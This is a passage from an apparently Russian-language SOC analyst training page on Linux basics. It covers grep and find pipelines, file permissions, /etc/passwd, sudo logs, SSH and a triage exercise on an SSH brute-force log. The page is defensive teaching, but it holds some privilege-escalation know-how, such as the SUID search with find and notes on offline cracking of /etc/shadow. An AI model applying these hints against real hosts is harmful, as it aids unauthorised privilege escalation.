+grep &quot;183.62.140.253&quot; /cases/2026-09-23-labsz/OpenSSH_2k.log | head -3 &gt;&gt; evidence.txt
+</code></pre>
+<p>Первая команда создаёт папку и заходит в неё, только если папка создалась. Вторая кладёт в файл строку успешного входа, третья дописывает первые строки от главного атакующего.</p></aside>
+<p>Помни и обратную сторону <code>&gt;</code>: перенаправление в существующий файл стирает его содержимое. Так же легко пропадает история команд пользователя в <code>~/.bash_history</code>. Сокрытие следов через очистку истории описано в ATT&amp;CK как Indicator Removal: Clear Command History (T1070.003), в версии 19 это тактика Stealth <sup class="refs">[<a class="ref" href="#src-t1070">4</a>]</sup>. Для тебя вывод практический: пустой или подозрительно короткий <code>.bash_history</code> у активного пользователя — повод насторожиться и указать это в тикете.</p>
+<details class="deep"><summary><span class="kicker">Копнуть глубже</span> Пайп <code>|</code> — главный инструмент аналитика в терминале</summary><p>В Task 7 его нет, а без него SOC в терминале не работает. <code>|</code> передаёт вывод одной команды на вход следующей, как конвейер <sup class="refs">[<a class="ref" href="#src-man-bash">3</a>]</sup>. Каждая команда делает одну маленькую вещь, а цепочка решает задачу целиком.</p>
+<p>Вопрос runbook «кто нас долбит?» решается одной строкой:</p>
+<pre><code>grep &quot;Failed password&quot; OpenSSH_2k.log | grep -oE &quot;from [0-9.]+&quot; | sort | uniq -c | sort -rn | head -5
+</code></pre>
+<p><figure class="diagram"><div class="dw"><svg viewBox="0 0 760 150" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Пайплайн: из 2000 строк лога в топ-5 IP">
+<rect class="d-box" x="4" y="10" width="112" height="54" rx="6"/>
+<text class="d-t" x="60.0" y="42" text-anchor="middle" style="font-size:11.5px">OpenSSH_2k.log</text>
+<text class="d-n" x="60.0" y="92" text-anchor="middle" style="font-size:20px">2000</text>
+<text class="d-s" x="60.0" y="112" text-anchor="middle">строк на</text>
+<text class="d-s" x="60.0" y="127" text-anchor="middle">входе</text>
+<text class="d-n" x="124.0" y="42" text-anchor="middle">|</text>
+<rect class="d-hi" x="132" y="10" width="112" height="54" rx="6"/>
+<text class="d-t" x="188.0" y="33" text-anchor="middle" style="font-size:11.5px">grep</text>
+<text class="d-t" x="188.0" y="51" text-anchor="middle" style="font-size:11px;font-weight:400">"Failed password"</text>
+<text class="d-n" x="188.0" y="92" text-anchor="middle" style="font-size:20px">520</text>
+<text class="d-s" x="188.0" y="112" text-anchor="middle">строк с</text>
+<text class="d-s" x="188.0" y="127" text-anchor="middle">неудачным входом</text>
+<text class="d-n" x="252.0" y="42" text-anchor="middle">|</text>
+<rect class="d-box" x="260" y="10" width="112" height="54" rx="6"/>
+<text class="d-t" x="316.0" y="33" text-anchor="middle" style="font-size:11.5px">grep -oE</text>
+<text class="d-t" x="316.0" y="51" text-anchor="middle" style="font-size:11px;font-weight:400">"from [0-9.]+"</text>
+<text class="d-n" x="316.0" y="92" text-anchor="middle" style="font-size:20px">520</text>
+<text class="d-s" x="316.0" y="112" text-anchor="middle">кусочков «from</text>
+<text class="d-s" x="316.0" y="127" text-anchor="middle">IP»</text>
+<text class="d-n" x="380.0" y="42" text-anchor="middle">|</text>
+<rect class="d-box" x="388" y="10" width="112" height="54" rx="6"/>
+<text class="d-t" x="444.0" y="42" text-anchor="middle" style="font-size:11.5px">sort</text>
+<text class="d-n" x="444.0" y="92" text-anchor="middle" style="font-size:20px">520</text>
+<text class="d-s" x="444.0" y="112" text-anchor="middle">одинаковые IP</text>
+<text class="d-s" x="444.0" y="127" text-anchor="middle">рядом</text>
+<text class="d-n" x="508.0" y="42" text-anchor="middle">|</text>
+<rect class="d-hi" x="516" y="10" width="112" height="54" rx="6"/>
+<text class="d-t" x="572.0" y="42" text-anchor="middle" style="font-size:11.5px">uniq -c</text>
+<text class="d-n" x="572.0" y="92" text-anchor="middle" style="font-size:20px">23</text>
+<text class="d-s" x="572.0" y="112" text-anchor="middle">уникальных IP</text>
+<text class="d-s" x="572.0" y="127" text-anchor="middle">со счётчиком</text>
+<text class="d-n" x="636.0" y="42" text-anchor="middle">|</text>
+<rect class="d-box" x="644" y="10" width="112" height="54" rx="6"/>
+<text class="d-t" x="700.0" y="33" text-anchor="middle" style="font-size:11.5px">sort -rn</text>
+<text class="d-t" x="700.0" y="51" text-anchor="middle" style="font-size:11px;font-weight:400">| head -5</text>
+<text class="d-n" x="700.0" y="92" text-anchor="middle" style="font-size:20px">5</text>
+<text class="d-s" x="700.0" y="112" text-anchor="middle">самых настырных</text>
+<text class="d-s" x="700.0" y="127" text-anchor="middle">IP</text>
+</svg></div></figure></p>
+<p>Результат на реальном логе:</p>
+<pre><code>    286 from 183.62.140.253
+     80 from 187.141.143.180
+     46 from 103.99.0.122
+     26 from 112.95.230.3
+     18 from 5.188.10.180
+</code></pre>
+<p>Разбор по звеньям: <code>grep -oE</code> печатает <strong>только</strong> совпавший кусок (<code>-o</code>) по расширенному шаблону (<code>-E</code>), здесь «from» и IP. <code>sort</code> ставит одинаковые строки рядом, и это обязательно: <code>uniq -c</code> схлопывает только <strong>соседние</strong> дубли и считает их. <code>sort -rn</code> сортирует по числу (<code>-n</code>) в обратном порядке (<code>-r</code>), <code>head -5</code> отрезает верх. Запомни эту цепочку как есть — она работает с любым полем любого лога.</p></details>
+<details class="deep"><summary><span class="kicker">Копнуть глубже</span> Флаги grep и find, которые реально нужны</summary><table>
+<thead>
+<tr>
+<th>Флаг</th>
+<th>Что делает</th>
+<th>Когда нужен</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>grep -E</code></td>
+<td>расширенные шаблоны: <code>+</code>, <code>?</code>, «или»</td>
+<td><code>grep -E "Failed.*root"</code></td>
+</tr>
+<tr>
+<td><code>grep -o</code></td>
+<td>печатает только совпадение</td>
+<td>вытащить IP или имя</td>
+</tr>
+<tr>
+<td><code>grep -r "шаблон" каталог</code></td>
+<td>ищет по всем файлам внутри</td>
+<td>«где в /etc упоминается этот IP?»</td>
+</tr>
+<tr>
+<td><code>grep -A2 -B2</code></td>
+<td>2 строки после/до совпадения</td>
+<td>контекст вокруг события</td>
+</tr>
+<tr>
+<td><code>find . -mtime -1</code></td>
+<td>изменены за последние сутки</td>
+<td>что менялось с момента атаки</td>
+</tr>
+<tr>
+<td><code>find / -user fztu</code></td>
+<td>файлы, принадлежащие пользователю</td>
+<td>что оставил подозрительный аккаунт</td>
+</tr>
+<tr>
+<td><code>find / -perm -4000</code></td>
+<td>файлы с битом SUID</td>
+<td>классика поиска повышения прав (глава 2)</td>
+</tr>
+</tbody>
+</table>
+<p>«Или» в <code>grep -E</code> пишется вертикальной чертой: <code>grep -E "Failed|Invalid" OpenSSH_2k.log</code>. Внутри кавычек это не пайп, а часть шаблона.</p>
+<p>Непонятную команду из тикета или отчёта вставляй в explainshell.com: он разберёт каждый флаг по man-страницам <sup class="refs">[<a class="ref" href="#src-explainshell">5</a>]</sup>.</p></details>
+<details class="deep"><summary><span class="kicker">Копнуть глубже</span> На маке: BSD ≠ GNU</summary><p>Практику ты будешь делать в Терминале мака, а там утилиты из BSD. Отличия, на которые наткнёшься в этом модуле:</p>
+<ul>
+<li><strong><code>find</code> без пути не работает.</strong> На Linux <code>find -name "*.log"</code> ищет от текущего каталога, а на маке выдаст ошибку. Всегда пиши путь явно: <code>find . -name "*.log"</code> — так работает везде <sup class="refs">[<a class="ref" href="#src-bsd-find">6</a>, <a class="ref" href="#src-man-find">7</a>]</sup>.</li>
+<li><strong><code>ls --help</code> на маке не работает:</strong> у BSD-утилит нет длинного <code>--help</code>. Справка — <code>man ls</code>.</li>
+<li><strong><code>grep -P</code></strong> (Perl-шаблоны) на маке нет. Пиши <code>grep -E</code> — оно есть и там, и там.</li>
+<li><strong><code>wget</code> нет из коробки</strong>, есть <code>curl</code>: <code>curl -O адрес</code> скачает файл под его именем.</li>
+<li><strong>Ловушка <code>wc -l</code>:</strong> на <code>OpenSSH_2k.log</code> она покажет <strong>1999</strong>, хотя записей 2000. <code>wc -l</code> считает символы перевода строки, а у последней строки его нет. Так ведёт себя и Linux, и мак. Нужна точность — <code>awk 'END{print NR}' файл</code>.</li>
+</ul></details>
+<aside class="mistakes"><div class="kicker">Где ошибаются новички</div><ul>
+<li><strong>Читать <code>cat</code>'ом файл на тысячи строк.</strong> Сначала <code>wc -l</code>, потом <code>head</code>, <code>tail</code>, <code>grep</code> или <code>less</code>.</li>
+<li><strong><code>&gt;</code> вместо <code>&gt;&gt;</code>.</strong> Одна лишняя стрелка — и заметки по кейсу перезаписаны. Перед Enter смотри на стрелки.</li>
+<li><strong>Шаблон find без кавычек:</strong> <code>find . -name *.log</code>. Пиши <code>"*.log"</code>.</li>
+<li><strong><code>uniq -c</code> без <code>sort</code></strong> перед ним. Счётчики получаются мелкие и неверные, потому что <code>uniq</code> не видит несоседние дубли.</li>
+<li><strong>Считать строки попытками.</strong> В этом логе есть строки <code>message repeated 5 times: [ Failed password … ]</code>: одна строка = пять попыток. <code>grep -c</code> даёт 520 строк, а попыток на деле 528 (518 одиночных + 2 × 5).</li>
+<li><strong>Верить слову «BREAK-IN».</strong> Сначала смысл строки и соседние строки того же PID, потом вердикт.</li>
+</ul></aside>
+<div class="terms"><div class="kicker">Термины</div><div class="tw"><table><thead><tr><th>EN</th><th>RU</th><th>DE</th></tr></thead><tbody><tr><td>terminal / shell</td><td>терминал / командная оболочка</td><td>Terminal / Shell</td></tr><tr><td>command</td><td>команда</td><td>Befehl</td></tr><tr><td>directory</td><td>каталог, папка</td><td>Verzeichnis</td></tr><tr><td>home directory</td><td>домашний каталог</td><td>Home-Verzeichnis</td></tr><tr><td>path (absolute / relative)</td><td>путь (абсолютный / относительный)</td><td>Pfad (absolut / relativ)</td></tr><tr><td>file</td><td>файл</td><td>Datei</td></tr><tr><td>to search</td><td>искать</td><td>suchen</td></tr><tr><td>pipe</td><td>пайп, конвейер</td><td>Pipe</td></tr><tr><td>redirect</td><td>перенаправление</td><td>Umleitung</td></tr><tr><td>failed login</td><td>неудачный вход</td><td>fehlgeschlagene Anmeldung</td></tr><tr><td>brute force</td><td>перебор паролей</td><td>Brute-Force-Angriff</td></tr></tbody></table></div></div>
+<p><strong>Связи.</strong> Шелл подробнее разбирается в комнате Linux Shells (Cyber Security 101). Цепочку <code>grep | sort | uniq -c</code> ты увидишь снова, когда будешь разбирать логи Apache и SSH на путях SOC.</p>
+<h2 id="ch2">Глава 2. SSH, файлы и права (Part 2)</h2>
+<p><strong>Аналогия.</strong> Linux — это офисное здание с электронными пропусками. У каждого сотрудника (пользователя) своя карта, у каждой двери (файла) табличка: кто хозяин, какой отдел (группа) и что можно остальным. Один сотрудник, охранник с мастер-ключом, — root: ему открыты все двери. SSH — это вход в здание через проходную с другого конца города: показал пропуск (пароль или ключ), и ты внутри, как будто пришёл ногами. Журнал проходной — это наш <code>auth</code>-лог.</p>
+<p><strong>Зачем это SOC-аналитику.</strong> Половина вопросов по Linux-инциденту звучит так: «кто это сделал и мог ли он это сделать?». Кто вошёл, под каким пользователем, есть ли у него права на файл, стал ли он root. Если ты не читаешь <code>ls -l</code> и <code>/etc/passwd</code> с листа, ты не ответишь ни на один из этих вопросов.</p>
+<aside class="shift"><div class="kicker">Ты на смене</div><p>Возвращаемся к тикету. Есть строка <code>Accepted password for fztu from 119.137.62.142</code> в 09:32:20, посреди перебора. Надо решить, это успешный брут или обычный сотрудник пришёл на работу. Для этого нужно понять, кто такой <code>fztu</code>, откуда обычно входит и связан ли его вход с атакующими адресами.</p></aside>
+<h3>SSH: вход в машину издалека</h3>
+<p>В Task 2 ты впервые подключаешься к машине сам <sup class="refs">[<a class="ref" href="#src-thm-lf2">8</a>]</sup>:</p>
+<pre><code>ssh tryhackme@10.10.x.x
+</code></pre>
+<p>Формат <code>ssh пользователь@адрес</code>. Если сервер слушает не 22-й порт, добавляется <code>-p 2222</code>. Первое подключение спросит, доверяешь ли ты отпечатку ключа сервера (fingerprint): это защита от подмены сервера. Потом спросит пароль. <strong>При вводе пароля символы не отображаются</strong>, даже звёздочки, — так и задумано.</p>
+<p>С точки зрения SOC у входа два способа: <strong>по паролю</strong> (<code>Accepted password</code>) и <strong>по ключу</strong> (<code>Accepted publickey</code>). Пароль можно подобрать, поэтому весь интернет и долбит порт 22. Ключ подобрать нельзя, и хорошо настроенный сервер вход по паролю просто выключает. Отсюда первая рекомендация в любом отчёте про SSH-брут: отключить вход по паролю для внешних адресов, запретить прямой вход root и поставить fail2ban.</p>
+<details class="deep"><summary><span class="kicker">Копнуть глубже</span> authorized_keys — тихая закреплённость</summary><p>Ключи, с которыми пускают пользователя, лежат в <code>~/.ssh/authorized_keys</code>, по одному публичному ключу на строку. Чужой ключ в этом файле означает, что его владелец входит без пароля, даже если пароль сменят. Для защитника признаки такие: файл изменился недавно (<code>ls -l --time-style=full-iso ~/.ssh/</code>), в нём ключ, которого нет в списке, согласованном с клиентом, и в логе <code>Accepted publickey</code> с незнакомого адреса. В ATT&amp;CK это Account Manipulation: SSH Authorized Keys (T1098.004), тактики Persistence и Privilege Escalation <sup class="refs">[<a class="ref" href="#src-t1098-004">9</a>]</sup>. Для L1 вывод простой: после подтверждённого взлома проверка <code>authorized_keys</code> у всех пользователей и у root обязана быть в рекомендациях к эскалации.</p></details>
+<h3>Флаги, --help и man</h3>
+<p>Task 3 учит, что команды ведут себя по-разному в зависимости от <strong>флагов</strong> (они же ключи, switches): <code>ls</code> показывает имена, <code>ls -a</code> добавляет скрытые файлы, <code>ls -l</code> включает подробный формат. Флаги склеиваются: <code>ls -la</code>.</p>
+<p>Скрытыми в Linux считаются файлы, имя которых начинается с точки: <code>.bash_history</code>, <code>.ssh</code>. Никакого особого атрибута тут нет, просто <code>ls</code> без <code>-a</code> их не показывает. Атакующие этим пользуются: папка <code>/tmp/.x</code> или <code>/dev/shm/.cache</code> не видна при беглом взгляде. Поэтому на чужом хосте ты всегда смотришь через <code>ls -la</code>.</p>
+<p>Где узнать флаги? У большинства GNU-команд есть краткая справка <code>--help</code> и полное руководство <code>man</code>: <code>man ls</code>. Внутри man двигаешься стрелками, <code>/слово</code> ищет, <code>n</code> прыгает к следующему совпадению, <code>q</code> выходит. Комната спрашивает, какой флаг <code>ls</code> показывает размеры в удобном для человека виде (K, M, G). Найди его сам: открой <code>man ls</code> и поищи <code>/human</code>. Это и есть навык, ради которого задание существует.</p>
+<h3>Файлы: touch, mkdir, cp, mv, rm, file</h3>
+<p>Task 4 — рабочие руки <sup class="refs">[<a class="ref" href="#src-thm-lf2">8</a>]</sup>:</p>
+<table>
+<thead>
+<tr>
+<th>Команда</th>
+<th>Что делает</th>
+<th>Пример</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>touch имя</code></td>
+<td>создаёт пустой файл (или обновляет время изменения)</td>
+<td><code>touch report.txt</code></td>
+</tr>
+<tr>
+<td><code>mkdir имя</code></td>
+<td>создаёт каталог (<code>-p</code> — вместе с родителями)</td>
+<td><code>mkdir -p cases/labsz</code></td>
+</tr>
+<tr>
+<td><code>cp откуда куда</code></td>
+<td>копирует (<code>-r</code> — каталоги)</td>
+<td><code>cp auth.log cases/labsz/</code></td>
+</tr>
+<tr>
+<td><code>mv откуда куда</code></td>
+<td>перемещает или переименовывает</td>
+<td><code>mv draft.txt final.txt</code></td>
+</tr>
+<tr>
+<td><code>rm имя</code></td>
+<td>удаляет (<code>-r</code> — каталоги)</td>
+<td><code>rm draft.txt</code></td>
+</tr>
+<tr>
+<td><code>file имя</code></td>
+<td>определяет, <strong>что это за файл на самом деле</strong></td>
+<td><code>file update.png</code></td>
+</tr>
+</tbody>
+</table>
+<p>У <code>rm</code> нет корзины: удалил — значит удалил. <code>rm -rf</code> на неправильном пути — самая дорогая опечатка в Linux.</p>
+<p>Самая недооценённая команда тут <code>file</code>. Она смотрит не на расширение, а на первые байты содержимого («магические числа»). Файл <code>update.png</code>, про который <code>file</code> пишет <code>ELF 64-bit LSB executable</code>, — это не картинка, а программа для Linux, переодетая под картинку. Для SOC такая находка в <code>/tmp</code> — сразу красный флаг.</p>
+<aside class="note"><div class="kicker">Важно</div><p>Работаешь с уликами — работай с копией: <code>cp</code>, а не <code>mv</code>. У копии меняются время и владелец, поэтому оригинальные метаданные фиксируй до любых действий (<code>ls -l --time-style=full-iso</code>). На настоящей смене сбор улик делает L2 или IR по своей процедуре. Тебе важно не испортить картину до их прихода.</p></aside>
+<h3>Права: читаем ls -l как L2</h3>
+<p>Task 5 — сердце главы <sup class="refs">[<a class="ref" href="#src-thm-lf2">8</a>]</sup>. У каждого файла есть владелец, группа и три набора прав: для владельца, для группы и для всех остальных. Права — это <code>r</code> (read, читать), <code>w</code> (write, писать) и <code>x</code> (execute, выполнять; для каталога — входить в него).</p>
+<p>Вот как выглядит <code>auth</code>-лог на Ubuntu. Разбери строку:</p>
+<div class="field"><div class="kicker">Разбор строки — жми на кусок</div><div class="ftitle">Строка ls -l</div><div class="fline"><button type="button" class="seg" data-i="0">-</button><button type="button" class="seg" data-i="1">rw-</button><button type="button" class="seg" data-i="2">r--</button><button type="button" class="seg" data-i="3">---</button> 1 <button type="button" class="seg" data-i="4">syslog</button> <button type="button" class="seg" data-i="5">adm</button> <button type="button" class="seg" data-i="6">1.2M</button> <button type="button" class="seg" data-i="7">Dec 10 11:04</button> auth.log</div><div class="fnotes"><div class="segnote" data-i="0" hidden><code>-</code> — Тип. <code>-</code> — обычный файл, <code>d</code> — каталог, <code>l</code> — символическая ссылка.</div><div class="segnote" data-i="1" hidden><code>rw-</code> — Права <strong>владельца</strong>: читать и писать, но не выполнять.</div><div class="segnote" data-i="2" hidden><code>r--</code> — Права <strong>группы</strong>: только читать.</div><div class="segnote" data-i="3" hidden><code>---</code> — Права <strong>всех остальных</strong>: ничего. Поэтому обычный пользователь не может прочитать <code>auth.log</code>.</div><div class="segnote" data-i="4" hidden><code>syslog</code> — Владелец — служебный пользователь, от имени которого пишет демон логирования.</div><div class="segnote" data-i="5" hidden><code>adm</code> — Группа. На Debian/Ubuntu группа <code>adm</code> исторически даёт чтение системных логов. Админов и мониторинг кладут в неё, а не дают им root.</div><div class="segnote" data-i="6" hidden><code>1.2M</code> — Размер, в удобочитаемом виде (при нужном флаге).</div><div class="segnote" data-i="7" hidden><code>Dec 10 11:04</code> — Время последнего изменения. Для лога — время последней записи.</div><div class="fhint">Нажми на любой подсвеченный фрагмент.</div></div><button type="button" class="fall">Показать все пояснения</button></div>
+<p>Права пишут и числами: <code>r</code> = 4, <code>w</code> = 2, <code>x</code> = 1, в каждой тройке их складывают. <code>rw-r-----</code> — это 6, 4, 0, то есть <strong>640</strong>. Меняет права <code>chmod</code>: <code>chmod 600 notes.txt</code> оставит доступ только владельцу <sup class="refs">[<a class="ref" href="#src-man-chmod">10</a>]</sup>.</p>
+<p><strong>Пользователи и группы.</strong> Список пользователей хранится в <code>/etc/passwd</code>. Разбери строку. Она учебная: в наборе loghub нет файла passwd сервера LabSZ, поэтому я показываю, как выглядела бы запись обычного сотрудника.</p>
+<div class="field"><div class="kicker">Разбор строки — жми на кусок</div><div class="ftitle">Строка /etc/passwd (учебная)</div><div class="fline"><button type="button" class="seg" data-i="0">fztu</button>:<button type="button" class="seg" data-i="1">x</button>:<button type="button" class="seg" data-i="2">1001</button>:<button type="button" class="seg" data-i="3">1001</button>:<button type="button" class="seg" data-i="4">Fu Zhen Tu,,,</button>:<button type="button" class="seg" data-i="5">/home/fztu</button>:<button type="button" class="seg" data-i="6">/bin/bash</button></div><div class="fnotes"><div class="segnote" data-i="0" hidden><code>fztu</code> — Логин.</div><div class="segnote" data-i="1" hidden><code>x</code> — Пароль не здесь: «x» значит, что хэш лежит в <code>/etc/shadow</code>, который читает только root <sup class="refs">[<a class="ref" href="#src-passwd5">11</a>]</sup>.</div><div class="segnote" data-i="2" hidden><code>1001</code> — <strong>UID</strong> — номер пользователя. У root всегда <strong>0</strong>. На Debian/Ubuntu обычные люди начинаются с 1000, служебные учётки идут ниже.</div><div class="segnote" data-i="3" hidden><code>1001</code> — GID — номер основной группы.</div><div class="segnote" data-i="4" hidden><code>Fu Zhen Tu,,,</code> — Поле-комментарий (GECOS): обычно полное имя.</div><div class="segnote" data-i="5" hidden><code>/home/fztu</code> — Домашний каталог.</div><div class="segnote" data-i="6" hidden><code>/bin/bash</code> — Оболочка при входе. У служебных учёток тут <code>/usr/sbin/nologin</code> или <code>/bin/false</code>: интерактивно войти ими нельзя.</div><div class="fhint">Нажми на любой подсвеченный фрагмент.</div></div><button type="button" class="fall">Показать все пояснения</button></div>
+<p>Две вещи из <code>/etc/passwd</code>, которые SOC проверяет всегда. Первая — <strong>второй пользователь с UID 0</strong>: это второй root, классическая закладка (<code>awk -F: '$3==0' /etc/passwd</code> должен вернуть одну строку). Вторая — <strong>новый пользователь, которого вчера не было</strong>: создание локальной учётки — это Create Account: Local Account (T1136.001), тактика Persistence <sup class="refs">[<a class="ref" href="#src-t1136-001">12</a>]</sup>.</p>
+<p><strong>su и sudo.</strong> <code>su имя</code> переключает тебя на другого пользователя. Нужен <strong>его</strong> пароль, например <code>su anna</code>. Флаг <code>-l</code> (или просто <code>-</code>) открывает полноценный вход: с его домашним каталогом и окружением. <code>sudo команда</code> выполняет одну команду от имени root, и спрашивает он <strong>твой</strong> пароль, если ты в списке разрешённых. Для SOC разница в следах: каждый вызов <code>sudo</code> оставляет в <code>auth</code>-логе строку с тем, кто, где и что запускал. Вот учебная строка:</p>
+<pre><code>Dec 10 09:40:02 LabSZ sudo:     fztu : TTY=pts/0 ; PWD=/home/fztu ; USER=root ; COMMAND=/usr/bin/apt update
+</code></pre>
+<p>Читается так: fztu из своего домашнего каталога запустил <code>apt update</code> от root. Если этот же пользователь вдруг делает <code>sudo</code> на <code>/bin/bash</code>, <code>useradd</code> или правку <code>/etc/sudoers</code>, это уже вопрос к L2.</p>
+<details class="deep"><summary><span class="kicker">Копнуть глубже</span> /etc/shadow и хэши паролей</summary><p><code>/etc/shadow</code> хранит хэши паролей, и прочитать его может только root. В каждой строке логин, хэш и сроки действия. По префиксу хэша видно алгоритм: <code>$y$</code> — yescrypt, который рекомендован для новых хэшей, <code>$6$</code> — sha512crypt, ещё допустимый <sup class="refs">[<a class="ref" href="#src-crypt5">13</a>]</sup>. Хэш в <code>*</code> или <code>!</code> значит, что вход по паролю закрыт. Атакующему <code>/etc/shadow</code> нужен, чтобы подбирать пароли офлайн, у себя, без единой строки <code>Failed password</code> в твоих логах. Поэтому любое чтение shadow не от root-процессов системы — повод эскалировать.</p></details>
+<details class="deep"><summary><span class="kicker">Копнуть глубже</span> Особые биты: SUID и sticky</summary><p>Посмотри на <code>ls -l /usr/bin/passwd</code>: там <code>-rwsr-xr-x</code>. Буква <code>s</code> на месте <code>x</code> владельца — это <strong>SUID</strong>: программа запускается с правами владельца файла (root), кто бы её ни вызвал. Иначе обычный пользователь не смог бы сменить себе пароль, ведь для этого надо писать в <code>/etc/shadow</code>. Если SUID стоит на чём-то вроде <code>bash</code> или <code>find</code>, это дверь к root. <code>find / -perm -4000 2&gt;/dev/null</code> перечисляет все такие файлы. Подробно этим займёшься в комнатах про повышение привилегий.</p>
+<p>У <code>/tmp</code> права <code>drwxrwxrwt</code>. Писать может каждый, а <code>t</code> на конце — <strong>sticky bit</strong>: удалить файл может только его хозяин. Каталог, куда может писать любой процесс, — любимое место для скачанных инструментов. Об этом глава 3.</p></details>
+<aside class="shift"><div class="kicker">Ты на смене</div><p>Разбираешь <code>fztu</code>. Что известно по логу:</p>
+<ul>
+<li><code>grep -c "fztu" OpenSSH_2k.log</code> → <strong>3</strong> строки: вход, открытие сессии, закрытие сессии. <strong>Ни одной</strong> неудачной попытки для <code>fztu</code> за весь период: его никто не подбирал.</li>
+<li><code>grep -c "119.137.62.142" OpenSSH_2k.log</code> → <strong>2</strong> строки: вход и отключение. Этот IP ни разу не ошибся паролем и в переборе не участвует.</li>
+<li>Сессия шла с 09:32:20 до 09:45:06, то есть 12 минут 46 секунд.</li>
+</ul>
+<p>Так брут не выглядит. Успешный подбор оставляет десятки <code>Failed password for X from IP</code>, а потом <code>Accepted password for X from того же IP</code>. Но это ещё не «всё чисто»: пароль могли украсть иначе, например фишингом. Поэтому runbook требует второй шаг.</p></aside>
+<div class="triage" data-answer="DIG"><div class="kicker">Триаж</div><div class="ttitle">Алерт: «Successful SSH login during brute-force activity» — LabSZ, user fztu</div><pre class="log"><code>Dec 10 09:32:20 LabSZ sshd[24680]: Accepted password for fztu from 119.137.62.142 port 49116 ssh2
+Dec 10 09:32:20 LabSZ sshd[24680]: pam_unix(sshd:session): session opened for user fztu by (uid=0)
+Dec 10 09:45:06 LabSZ sshd[24761]: Received disconnect from 119.137.62.142: 11: disconnected by user
+Dec 10 09:45:06 LabSZ sshd[24680]: pam_unix(sshd:session): session closed for user fztu</code></pre><div class="verdicts"><button type="button" class="verdict" data-v="TP">Инцидент (TP)</button><button type="button" class="verdict" data-v="FP">Ложное (FP)</button><button type="button" class="verdict" data-v="DIG">Копать дальше</button></div><div class="why" hidden><p><strong>Копать дальше — и быстро закрыть вопрос.</strong> Признаков успешного брута нет: у <code>fztu</code> ноль неудачных попыток, его IP в переборе не участвует. Но и сказать «легитимно» по одному куску лога нельзя, потому что у тебя нет базовой линии (baseline): входит ли <code>fztu</code> обычно с этого адреса и в это время.</p>
+<p>Что делаешь как L1: обогащаешь <code>119.137.62.142</code> (репутация в AbuseIPDB <sup class="refs">[<a class="ref" href="#src-abuseipdb">14</a>]</sup> и VirusTotal, провайдер, страна), проверяешь в SIEM прошлые входы <code>fztu</code>, пишешь клиенту вопрос «Ist der Login von fztu um 09:32 Serverzeit erwartet?». Если IP чистый, входы с него обычны, а клиент подтверждает — закрываешь как Benign True Positive (событие реальное, но разрешённое). Если хоть что-то не сходится — эскалация на L2.</p></div></div>
+<h3>Карта каталогов</h3>
+<p>Task 6 знакомит с главными каталогами <sup class="refs">[<a class="ref" href="#src-thm-lf2">8</a>, <a class="ref" href="#src-fhs">15</a>]</sup>. Всё в Linux растёт из корня <code>/</code>. Отдельных дисков C: и D:, как в Windows, нет: второй диск просто «монтируется» в какую-нибудь папку.</p>
+<figure class="diagram"><div class="dw"><svg viewBox="0 0 760 250" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Карта каталогов Linux: куда SOC-аналитик смотрит первым">
+<rect class="d-box" x="350" y="8" width="60" height="34" rx="6"/><text class="d-t" x="380" y="30" text-anchor="middle">/</text>
+<path class="d-l" d="M380 42 V64 M59 64 H701"/>
+<path class="d-l" d="M59.0 64 V86"/>
+<rect class="d-hi" x="10" y="86" width="98" height="36" rx="6"/>
+<text class="d-t" x="59.0" y="109" text-anchor="middle">/etc</text>
+<text class="d-s" x="59.0" y="144" text-anchor="middle">настройки системы</text>
+<text class="d-s" x="59.0" y="160" text-anchor="middle">passwd, shadow</text>
+<text class="d-s" x="59.0" y="176" text-anchor="middle">crontab, ssh/</text>
+<path class="d-l" d="M165.0 64 V86"/>
+<rect class="d-hi" x="116" y="86" width="98" height="36" rx="6"/>
+<text class="d-t" x="165.0" y="109" text-anchor="middle">/home</text>
+<text class="d-s" x="165.0" y="144" text-anchor="middle">дома пользователей</text>
+<text class="d-s" x="165.0" y="160" text-anchor="middle">~/.bash_history</text>
+<text class="d-s" x="165.0" y="176" text-anchor="middle">~/.ssh/</text>
+<path class="d-l" d="M271.0 64 V86"/>
+<rect class="d-box" x="222" y="86" width="98" height="36" rx="6"/>
+<text class="d-t" x="271.0" y="109" text-anchor="middle">/root</text>
+<text class="d-s" x="271.0" y="144" text-anchor="middle">дом root</text>
+<text class="d-s" x="271.0" y="160" text-anchor="middle">его история</text>
+<text class="d-s" x="271.0" y="176" text-anchor="middle">команд</text>
+<path class="d-l" d="M377.0 64 V86"/>
+<rect class="d-hi" x="328" y="86" width="98" height="36" rx="6"/>
+<text class="d-t" x="377.0" y="109" text-anchor="middle">/tmp</text>
+<text class="d-s" x="377.0" y="144" text-anchor="middle">писать могут все</text>
+<text class="d-s" x="377.0" y="160" text-anchor="middle">чистится при</text>
+<text class="d-s" x="377.0" y="176" text-anchor="middle">перезагрузке</text>
+<path class="d-l" d="M483.0 64 V86"/>
+<rect class="d-hi" x="434" y="86" width="98" height="36" rx="6"/>
+<text class="d-t" x="483.0" y="109" text-anchor="middle">/var/log</text>
+<text class="d-s" x="483.0" y="144" text-anchor="middle">логи</text>
+<text class="d-s" x="483.0" y="160" text-anchor="middle">auth.log, syslog</text>
+<text class="d-s" x="483.0" y="176" text-anchor="middle">apache2/</text>
+<path class="d-l" d="M589.0 64 V86"/>
+<rect class="d-box" x="540" y="86" width="98" height="36" rx="6"/>
+<text class="d-t" x="589.0" y="109" text-anchor="middle">/proc</text>
+<text class="d-s" x="589.0" y="144" text-anchor="middle">не файлы, а окно</text>
+<text class="d-s" x="589.0" y="160" text-anchor="middle">в живые процессы</text>
+<text class="d-s" x="589.0" y="176" text-anchor="middle">/proc/&lt;PID&gt;/</text>
+<path class="d-l" d="M695.0 64 V86"/>
+<rect class="d-box" x="646" y="86" width="98" height="36" rx="6"/>
+<text class="d-t" x="695.0" y="109" text-anchor="middle">/usr/bin</text>
+<text class="d-s" x="695.0" y="144" text-anchor="middle">программы:</text>
+<text class="d-s" x="695.0" y="160" text-anchor="middle">ls, grep, find</text>
+<text class="d-s" x="695.0" y="176" text-anchor="middle">подмена = тревога</text>
+<rect class="d-hi" x="10" y="212" width="22" height="14" rx="3"/><text class="d-s" x="40" y="224">— сюда SOC-аналитик заглядывает первым при разборе Linux-хоста</text>
+</svg></div></figure>
+<ul>
